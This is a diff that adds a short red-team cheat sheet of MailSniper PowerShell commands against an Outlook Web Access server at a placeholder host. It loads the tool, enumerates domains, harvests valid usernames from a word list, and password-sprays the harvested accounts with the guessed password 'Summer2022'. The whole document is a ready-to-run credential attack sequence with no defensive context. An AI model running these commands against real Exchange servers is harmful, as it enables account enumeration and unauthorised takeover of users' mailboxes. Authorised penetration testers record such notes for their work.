@@ -1,0 +1,16 @@
+==============================================================================
+[+] MailSniper
+==============================================================================
+ipmo C:\Tools\MailSniper\MailSniper.ps1
+==============================================================================
+[+] Find Domains 
+==============================================================================
+ Invoke-DomainHarvestOWA -ExchHostname mail.example.io
+==============================================================================
+[+] Find Users OWA
+==============================================================================
+ Invoke-UsernameHarvestOWA -ExchHostname mail.example.io -Domain example.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
+==============================================================================
+[+] Password Spray
+==============================================================================
+Invoke-PasswordSprayOWA -ExchHostname mail.example.io -UserList .\Desktop\valid.txt -Password Summer2022
